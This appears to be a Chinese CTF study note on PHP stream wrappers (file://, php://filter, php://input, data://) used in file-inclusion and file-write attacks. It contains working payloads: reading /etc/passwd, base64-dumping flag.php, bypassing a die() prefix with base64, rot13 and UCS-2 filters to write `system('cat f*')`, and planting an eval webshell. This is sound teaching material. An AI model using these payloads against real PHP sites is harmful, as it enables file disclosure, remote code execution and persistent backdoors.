<h2 id="文件包含协议"><a href="#文件包含协议" class="headerlink" title="文件包含协议"></a>文件包含协议</h2><h3 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><ul>
<li><strong>条件</strong>：</li>
<li>allow_url_fopen：不受影响</li>
<li>allow_url_include：不受影响</li>
<li><strong>作用</strong>：</li>
</ul>
<p>用于访问本地文件系统。</p>
<ul>
<li><strong>说明</strong>：</li>
</ul>
<p><em>file:&#x2F;&#x2F;</em> 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径（不以&#x2F;、\、\或  Windows 盘符开头的路径）提供的路径将基于当前的工作目录。 在很多情况下是脚本所在的目录，除非被修改了。 使用 CLI  的时候，目录默认是脚本被调用时所在的目录。</p>
<p>在某些函数里，例如 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a> 和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>， <code>include_path</code> 会可选地搜索，也作为相对的路径。</p>
<ul>
<li><strong>用法</strong>：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br><span class="line">file://C:/Windows/win.ini</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>示例</strong>：</li>
</ul>
<p>file:&#x2F;&#x2F;[ 文件的绝对路径和文件名]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?filename=file:///etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/images/Ad6kbR0J2ozaqgxm2gwcH5Yxnne.png"></p>
<h3 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h3><ul>
<li><strong>条件</strong>：</li>
<li>allow_url_fopen：不受影响</li>
<li>allow_url_include：仅 <code>php://input</code>、 <code>php://stdin</code>、<code>php://memory</code>、<code>php://temp</code> 需要 <code>on</code></li>
<li><strong>作用</strong>：   访问各个输入 &#x2F; 输出流（I&#x2F;O streams）</li>
<li><strong>说明</strong>：   PHP 提供了一些杂项输入 &#x2F; 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，   内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</li>
</ul>
<p><em>中译中：PHP 自带了一批 “现成工具”：有的帮你接外部数据、发数据给外部，有的帮你存临时数据（不用建文件），有的帮你加工数据（读写字节时过滤处理），还有的帮你单独存错误 —— 这些工具统称 “杂项 IO 流”，直接用 <strong>php:&#x2F;&#x2F;xxx</strong> 就能调用，不用自己折腾基础功能。</em></p>
<h4 id="常见的-php-协议"><a href="#常见的-php-协议" class="headerlink" title="常见的 php 协议"></a>常见的 php 协议</h4><p><em>中译中:</em></p>
<p><strong>1.php:&#x2F;&#x2F;input</strong><em>“有一个只能读取、不能修改的专用通道，能拿到前端发给 PHP 的‘原汁原味’的请求数据（就是没被 PHP 处理过的原始数据）。但要注意两个前提：</em></p>
<p><em>如果你开了 PHP 的 <strong>enable_post_data_reading</strong> 这个设置（默认是开的）；</em></p>
<p><em>前端提交数据时，用的是 <strong>enctype&#x3D;”multipart&#x2F;form-data”</strong> 这种格式（通常用来上传文件、提交带文件的表单）；那这个通道（也就是 <strong>php:&#x2F;&#x2F;input</strong>）就用不了了 —— 读不到任何数据。”</em></p>
<p><strong>2.php:&#x2F;&#x2F;output</strong><em>“这是一个只能写、不能读的‘数据传送带’，你往上面写内容，就跟用 <strong>print</strong> 或 <strong>echo</strong> 打印东西一样 —— 最终都会送到浏览器 &#x2F; 客户端（比如浏览器显示文字、接口返回数据）。”</em></p>
<p>_它就是 <strong>echo</strong>&#x2F;<strong>print</strong> 的 “底层载体”：你写 <strong>echo “hello”</strong>，本质就是把 “hello” 放到这个 “传送带” 上，传送带再把内容传给浏览器；_</p>
<p><em>只能 “写” 不能 “读”：你能往上面丢数据（比如 <strong>echo</strong>、<strong>fwrite</strong> 写内容），但不能从上面拿数据（比如用 <strong>file_get_contents</strong> 读它，会失败）；</em></p>
<p>举个简单例子：</p>
<p>php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用 echo 打印（本质是往 php://output 写）echo &quot;hello&quot;;</span></span><br><span class="line"><span class="comment">// 直接往 php://output 写，效果和上面完全一样fwrite(fopen(&#x27;php://output&#x27;, &#x27;w&#x27;), &quot;hello&quot;);</span></span><br></pre></td></tr></table></figure>

<p><strong>3.php:&#x2F;&#x2F;fd</strong>_ —— “直接操作文件的‘快捷方式’”_</p>
<p><em>“从 PHP 5.3.6 开始有这个功能，它允许你直接访问服务器上已经打开的‘文件 &#x2F; 资源的编号’（这个编号叫‘文件描述符’）。比如 <strong>php:&#x2F;&#x2F;fd&#x2F;3</strong>，就对应着服务器上编号为 3 的那个打开的文件 &#x2F; 资源。”</em></p>
<p><em>先搞懂 “文件描述符”：服务器打开一个文件、网络连接、甚至终端时，会给它分配一个数字编号（比如 0 &#x3D; 标准输入、1 &#x3D; 标准输出、2 &#x3D; 错误输出，3 及以上是自定义的），就像快递的 “取件码”；</em></p>
<p><em>php:&#x2F;&#x2F;fd&#x2F;取件码</em>_ 就是 “凭取件码直接拿文件”：不用再写文件路径（比如 <strong>&#x2F;var&#x2F;log&#x2F;xxx.log</strong>），直接用编号就能操作已经打开的资源；_</p>
<p>简单例子（了解即可）：</p>
<p>比如服务器已经打开了一个日志文件，分配的描述符是 3，你可以直接写：</p>
<p>php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 往编号3的文件里写日志，不用再打开文件fwrite(fopen(&#x27;php://fd/3&#x27;, &#x27;w&#x27;), &quot;记录一条日志&quot;);</span></span><br></pre></td></tr></table></figure>

<p><strong>4.php:&#x2F;&#x2F;memory 或 php:&#x2F;&#x2F;temp</strong>_ —— “PHP 自带的临时储物箱”_</p>
<p><strong>原句通俗翻译</strong><em>：“从 PHP 5.1.0 开始有这两个，它们都像‘临时文件夹’，能存数据、取数据（既能读又能写），但不用你手动创建文件、不用删 —— 脚本执行完自动清空。两者的区别就一点：</em></p>
<p><em>php:&#x2F;&#x2F;memory：把数据全存在‘内存’里（相当于电脑的‘内存条’），读写特别快，但如果数据太大，会占满内存；</em></p>
<p><em>php:&#x2F;&#x2F;temp：先把数据存内存，等数据超过 2MB（默认限制），就自动转到系统的‘临时文件’里（相当于电脑的‘临时文件夹’），不会占太多内存；你还能自己改内存限制，比如 <strong>php:&#x2F;&#x2F;temp&#x2F;maxmemory:1048576</strong> 就是限制 1MB（1048576 字节 &#x3D; 1MB），超过就存磁盘。”</em></p>
<p><em>核心理解：</em></p>
<p><em>用途：临时存数据（比如处理大 CSV、拼接超长字符串、临时缓存数据），不用手动管理文件（不会留下垃圾文件）；</em></p>
<p><em>怎么选：数据小（比如几 KB、几十 KB）用 <strong>php:&#x2F;&#x2F;memory</strong>（快）；数据可能很大（比如几 MB、几十 MB）用 <strong>php:&#x2F;&#x2F;temp</strong>（不占内存）。</em></p>
<p>举个常用例子（处理临时数据）：</p>
<p>php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用 php://temp 存临时数据（适合可能很大的数据）</span></span><br><span class="line"><span class="variable">$temp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://temp&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line"><span class="comment">// r+ = 又能读又能写</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$temp</span>, <span class="string">&quot;这是临时数据1\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$temp</span>, <span class="string">&quot;这是临时数据2\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">rewind</span>(<span class="variable">$temp</span>); <span class="comment">// 把“读取指针”移到开头（不然读不到前面写的）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$temp</span>, <span class="number">1024</span>);</span><br><span class="line"><span class="comment">// 输出：这是临时数据1 这是临时数据2.</span></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$temp</span>); <span class="comment">// 关闭后，数据自动消失（内存/临时文件都清空）</span></span><br></pre></td></tr></table></figure>

<p><strong>5.php:&#x2F;&#x2F;filter</strong>_ —— “数据的‘预处理加工厂’”_</p>
<p><strong>原句通俗翻译</strong><em>：“从 PHP 5.0.0 开始有这个‘万能过滤器’，它不是直接存数据或传数据的通道，而是个‘数据加工厂’—— 你读文件、写文件时，能让数据先经过它‘加工’（比如转大写、去空格、解码），再拿到最终结果。尤其适合那些‘一步到位’的文件函数（比如 <strong>readfile()</strong> 直接读文件输出、<strong>file_get_contents()</strong> 直接读文件内容），这些函数本来没机会加工数据，用它就能中途加过滤处理。”</em></p>
<p><em>本质：“中间处理器”，不直接操作文件 &#x2F; 数据，只在 “数据传输过程中” 做加工；</em></p>
<p><em>常用场景：读文件时自动转格式、解码、过滤垃圾字符（比如读 Base64 编码的文件，直接解码再读）；</em></p>
<p><em>用法：把它当成 “前缀”，跟在文件路径前面，比如 <strong>php:&#x2F;&#x2F;filter&#x2F;加工规则&#x2F;resource&#x3D;文件路径</strong>。</em></p>
<p>举个实用例子（读文件时自动转大写）：</p>
<p>比如你有个 <code>test.txt</code>，内容是 <code>hello world</code>，想读的时候直接转成大写，不用额外写代码：</p>
<p>php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用 php://filter 做“转大写”处理，再读 test.txt</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/convert.iconv.UTF-8.UTF-8|string.toupper/resource=test.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>; <span class="comment">// 输出：HELLO WORLD（自动转大写）</span></span><br></pre></td></tr></table></figure>

<p>再比如读 Base64 编码的文件，直接解码：</p>
<p>php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先Base64解码，再读文件内容</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/convert.base64-decode/resource=encoded.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>; <span class="comment">// 直接输出解码后的原始内容</span></span><br></pre></td></tr></table></figure>

<h4 id="php-filter-参数详解"><a href="#php-filter-参数详解" class="headerlink" title="php:&#x2F;&#x2F;filter 参数详解"></a><strong>php:&#x2F;&#x2F;filter 参数详解</strong></h4><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>
<h5 id="可用的过滤器列表"><a href="#可用的过滤器列表" class="headerlink" title="可用的过滤器列表"></a><strong>可用的过滤器列表</strong></h5><p>在 CTF 竞赛中常用的为 <code>转换过滤器</code>，在一些极端情况下可以通过 <code>字符串过滤器</code> 实现 bypass，当然这里需要大家了解一下 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">PHP 支持的字符编码</a>，另外其他的过滤器类型详见：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p>
<hr>
<ul>
<li><strong>用法</strong>：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 直接读，PHP 代码会被解析php://filter/resource=flag.php# 针对 PHP 文件（常用）php://filter/read=convert.base64-encode/resource=flag.php# 其他字符编码php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.php# Rot13php://filter/string.rot13/resource=1.php# php://input[POST DATA部分]&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a><strong>示例</strong></h3><h4 id="convert"><a href="#convert" class="headerlink" title="convert"></a><strong>convert</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($x)&#123;</span><br><span class="line">    if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;</span><br><span class="line">            die(&#x27;too young too simple sometimes naive!&#x27;);    </span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">$contents=$_POST[&#x27;contents&#x27;];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);</span><br></pre></td></tr></table></figure>

<p>把 Base64 和 Rot13 过滤了，根据 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">PHP 支持的字符编码</a>，发现 PHP 支持的字符编码还是挺多的，我们这里随便选择一个进行使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: ?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.php</span><br><span class="line">POST: contents=?&lt;hp pystsme&quot;(ac tlf&quot;*;)</span><br></pre></td></tr></table></figure>

<p>关于代码生成，注意 <code>ucs-2</code> 编码的字符串位数一定要是偶数，否则会报错，<code>ucs-4</code> 编码的字符串位数一定要是 4 的倍数，否则会报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php system(&quot;cat fl*&quot;);&#x27;);</span><br><span class="line">// ?&lt;hp pystsme&quot;(ac tlf&quot;*;)</span><br></pre></td></tr></table></figure>

<h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a><strong>base64</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># index.php</span><br><span class="line">&lt;?php  highlight_file(__FILE__);</span><br><span class="line">  require($_GET[&#x27;filename&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># flag.php</span><br><span class="line">&lt;?php</span><br><span class="line">// $flag = &#x27;flag&#123;th14_1s_m3_fl4g&#125;&#x27;;</span><br><span class="line">echo &#x27;答案在注释里，自己找吧&#x27;;</span><br></pre></td></tr></table></figure>

<p>我们可以利用 <code>php://filter</code> 伪协议来读取文件内容，需要注意的是，<code>php://filter</code> 伪协议如果不指定过滤器的话，默认会解析 PHP 代码，所以我们需要指定 <code>convert.base64-encode</code> 过滤器来对文件内容进行编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h5 id="file-put-contents-函数介绍"><a href="#file-put-contents-函数介绍" class="headerlink" title="*file_put_contents() 函数介绍"></a><code>*file_put_contents()</code> 函数介绍</h5><p><code>file_put_contents()</code> 是 PHP 中<strong>最简洁的 “写文件” 函数</strong>—— 核心作用是：<strong>把数据直接写入文件</strong>，不用手动打开、关闭文件（底层自动帮你处理），相当于 <code>fopen()</code> + <code>fwrite()</code> + <code>fclose()</code> 三个函数的 “一站式简化版”。</p>
<p>一句话概括：<strong>“想把字符串、数组、二进制数据（比如图片）写到文件里，用它最方便”</strong>。</p>
<p><strong>一、基本语法</strong></p>
<p>php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(文件路径, 要写入的数据, 可选参数, 上下文);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>返回值：成功返回写入的字节数；失败返回 <code>false</code>（或 <code>0</code>，取决于数据是否为空）。</p>
</li>
<li><p>核心参数（前 2 个必传，后 2 个极少用）：</p>
<ol>
<li>文件路径：要写入的文件位置（比如 <code>./test.txt</code>、<code>/var/log/info.log</code>）；</li>
<li>要写入的数据：支持字符串、数组（会自动拼接成字符串）、二进制数据（比如图片字节）；</li>
<li>可选参数：比如 <code>FILE_APPEND</code>（追加内容，不覆盖原文件）、<code>LOCK_EX</code>（写文件时加锁，防止多人同时写冲突）；</li>
<li>上下文：几乎不用（复杂场景才用，比如远程文件）。</li>
</ol>
</li>
</ul>
<p><strong>二、常用场景示例（直接复制能用）</strong></p>
<p><strong>场景 1：基础用法 —— 覆盖写入文件（默认行为）</strong></p>
<p>把字符串直接写入文件，如果文件不存在，会自动创建；如果文件已存在，会覆盖原有内容。</p>
<p>php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">**<span class="meta">&lt;?php</span>**<span class="comment">// 要写入的数据（字符串）</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&quot;Hello World！\n这是用 file_put_contents 写的内容&quot;</span>;</span><br><span class="line"><span class="comment">// 写入文件（路径：当前目录下的 test.txt）</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./test.txt&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="comment">// 验证是否成功</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">false</span>) &#123;<span class="keyword">echo</span> <span class="string">&quot;写入成功！共写入 <span class="subst">$result</span> 个字节&quot;</span>;&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;<span class="keyword">echo</span> <span class="string">&quot;写入失败（可能是权限不够）&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行后，<code>test.txt</code> 里的内容就是：</li>
<li>plaintext</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello World！</span><br><span class="line">这是用 file_put_contents 写的内容</span><br></pre></td></tr></table></figure>

<p><strong>场景 2：追加内容（不覆盖原文件）</strong></p>
<p>用 <code>FILE_APPEND</code> 参数，在文件末尾加内容（比如写日志、累加数据）。</p>
<p>php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">**<span class="meta">&lt;?php</span>**<span class="comment">// 要追加的内容（比如一条日志，带时间）</span></span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>) . <span class="string">&quot; - 用户登录成功\n&quot;</span>;</span><br><span class="line"><span class="comment">// 追加到日志文件（FILE_APPEND 表示“追加”，不是覆盖）</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./user.log&#x27;</span>, <span class="variable">$log</span>, FILE_APPEND);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;日志写入成功&quot;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行多次后，<code>user.log</code> 会累加内容：</li>
<li>plaintext</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2025-11-09 10:30:00 - 用户登录成功</span><br><span class="line">2025-11-09 10:35:20 - 用户登录成功</span><br></pre></td></tr></table></figure>

<p><strong>场景 3：写入数组（自动拼接成字符串）</strong></p>
<p>如果传入数组，函数会自动把数组元素用空字符串拼接成一个字符串写入（数组元素必须是字符串 &#x2F; 数字，不能是对象）。</p>
<p>php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">**<span class="meta">&lt;?php</span>**<span class="comment">// 数组数据（会自动拼接成 &quot;姓名：张三 年龄：25 爱好：打球&quot;）</span></span><br><span class="line"><span class="variable">$userInfo</span> = [<span class="string">&quot;姓名：张三 &quot;</span>,<span class="string">&quot;年龄：25 &quot;</span>,<span class="string">&quot;爱好：打球&quot;</span>];<span class="comment">// 写入文件</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./user.txt&#x27;</span>, <span class="variable">$userInfo</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>执行后，<code>user.txt</code> 内容：<code>姓名：张三 年龄：25 爱好：打球</code></li>
</ul>
<p><code>str_replace()</code> 是 PHP 中最常用的 <strong>字符串替换函数</strong>—— 核心作用是：<strong>在一个字符串里，把指定的 “目标内容” 换成 “新内容”</strong>，支持单个替换、批量替换，用法简单且实用。</p>
<p>一句话概括：<strong>“查找字符串里的‘旧东西’，全部换成‘新东西’”</strong>。</p>
<h5 id="str-replace-函数介绍"><a href="#str-replace-函数介绍" class="headerlink" title="*str_replace() 函数介绍"></a><code>*str_replace()</code> 函数介绍</h5><p>php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 单个替换：把 $str 里的 $search 全换成 $replace</span></span><br><span class="line"><span class="title function_ invoke__">str_replace</span>(要查找的旧内容, 要替换的新内容, 原始字符串);</span><br><span class="line"><span class="comment">// 2. 批量替换：多个旧内容对应多个新内容（数组形式）</span></span><br><span class="line"><span class="title function_ invoke__">str_replace</span>(数组[旧内容<span class="number">1</span>, 旧内容<span class="number">2</span>], 数组[新内容<span class="number">1</span>, 新内容<span class="number">2</span>], 原始字符串);</span><br><span class="line"><span class="comment">// 3. 带计数：最后加一个变量，接收“替换了多少次”（可选）</span></span><br><span class="line"><span class="title function_ invoke__">str_replace</span>(旧内容, 新内容, 原始字符串, $替换次数);</span><br></pre></td></tr></table></figure>

<ul>
<li>返回值：替换后的<strong>新字符串</strong>（不会修改原始字符串，原始字符串保持不变）；</li>
<li>特点：<strong>区分大小写</strong>（比如替换 “php” 不会影响 “PHP”）、<strong>全局替换</strong>（找到的所有匹配内容都会被换）。</li>
</ul>
<h4 id="rot13-【绕过-die】"><a href="#rot13-【绕过-die】" class="headerlink" title="rot13 【绕过 die】"></a><strong>rot13 【绕过 die】</strong></h4><p><strong>(绕过 file_put_contents 已给 die 函数的限制)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $content = $_POST[&#x27;content&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>一个写文件的题，但是有过滤，不允许包含 <code>php</code> , <code>data</code> , <code>:</code> 和 <code>.</code> 但是在写入操作的时候，**HTTP 请求会自动做一次 URL 解码，**会把 <code>file</code> 参数进行 <code>urldecode</code>，所以我们可以两次 <code>urldecode</code> 来绕过过滤，然后只需要考虑如何绕过 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 中的 <code>die()</code> 即可</p>
<p>我们可以尝试使用 Base64 绕过 <code>die()</code>，Base64 的编码范围是 <code>0-9</code> , <code>a-z</code> , <code>A-Z</code> , <code>+</code> 和 <code>/</code> ，其他字符会被忽略，去掉不支持的字符，只剩下了 <code>phpdie</code> 了，因为 Base64 解码是按照 4 位 一组进行解码的，所以我们需要在最终编码出来的字符串中最前面添加两个字母，以达到 Base64 解码的规则</p>
<p>注意:file_put_contents 可以新建一个名为 1.php 的文件并写入代码.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 需要两次URL编码</span><br><span class="line">GET: ?file=php://filter/convert.base64-decode/resource=1.php// </span><br><span class="line">需要base64编码，编码后最前面添加两个字母如：aa</span><br><span class="line">POST: content=&lt;?php system(&#x27;cat f*&#x27;);</span><br></pre></td></tr></table></figure>

<p><u>豆包对这道题有更通俗的解读</u></p>
<p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/NG8PwBXh8isgJck3YDdcYk38nAg">rot13 解法一解释</a></p>
<p>另一种方法是使用 Rot13 编码(和 base64 绕过 die 的原理是相同的)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 需要两次URL编码GET: ?file=php://filter/string.rot13/resource=1.php// 需要Rot13编码POST: content=&lt;?php system(&#x27;cat f*&#x27;);</span><br></pre></td></tr></table></figure>

<p>Rot13 解码后写入的文件内容变为了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?cuc qvr(&#x27;大佬别秀了&#x27;);?&gt;&lt;?php system(&#x27;cat f*&#x27;);</span><br></pre></td></tr></table></figure>

<p>这样就可以绕过 <code>die()</code> 了</p>
<h4 id="input"><a href="#input" class="headerlink" title="input"></a><strong>input</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 注意使用 php://input 的时候必须开启 allow_url_include</span><br><span class="line">&lt;?php</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">  include($_GET[&#x27;filename&#x27;]);</span><br><span class="line">  ?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bi6QbpsWLo3qzuxayr2cFa8Pnde.jpeg"></p>
<p>当我们有写入操作的时候，可以直接写入一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&#x27;muma.php&#x27;, &#x27;&lt;?php @eval($_POST[cmd]);&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p><code>data://</code> 是 PHP 里的一种 “数据流协议”，核心作用是：<strong>直接把 “数据本身” 当成 “文件” 来用</strong>—— 不用真的创建一个物理文件（比如 1.php），而是把代码 &#x2F; 文本 “伪装成文件内容”，让 PHP 的 <code>include()</code>&#x2F;<code>require()</code> 函数执行它。</p>
<p>简单说：<code>data://</code> &#x3D; “无文件执行 PHP 代码” 的工具，前提是必须开 <code>allow_url_fopen=on</code> 和 <code>allow_url_include=on</code>（两个开关都要开，默认可能关，所以是漏洞常用场景）。</p>
<h4 id="一、为什么需要-data-？（生活类比）"><a href="#一、为什么需要-data-？（生活类比）" class="headerlink" title="*一、为什么需要 data:&#x2F;&#x2F;？（生活类比）*"></a>*<em>一、为什么需要 <strong><strong>data:&#x2F;&#x2F;</strong></strong>？（生活类比）</em>*</h4><p>你想让 PHP 执行一段代码，但服务器不让你上传文件（比如禁止传.php 文件），怎么办？<code>data://</code> 就像 “隐形文件”：你不用真的存文件到服务器，而是直接把代码 “嵌在 URL &#x2F; 参数里”，告诉 PHP：“把这段数据当成一个文件来执行”。</p>
